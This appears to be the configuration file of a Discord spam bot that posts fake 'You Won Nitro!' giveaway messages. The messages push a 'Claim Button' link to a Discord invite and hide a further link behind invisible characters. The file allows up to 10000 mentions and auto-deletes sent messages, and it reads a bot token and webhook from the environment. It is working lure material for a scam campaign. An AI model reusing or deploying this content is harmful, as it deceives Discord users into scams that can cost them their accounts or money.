module.exports = {
    token: process.env.token,
    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,
    webhook: process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    embed: [
        {
            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n\n> In order to redeem the Claim your 99.99$ Discord Nitro gift you\n>  MUST the **[Claim Button](https://discord.gg/M9sX68Vqxr)**\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)"
        }
    ],

    embed2: [
        {
            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n\n> In order to redeem the Claim your 99.99$ Discord Nitro gift you\n>  MUST the **[Claim Button](https://discord.gg/M9sX68Vqxr)**\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)"
        }
    ]
};
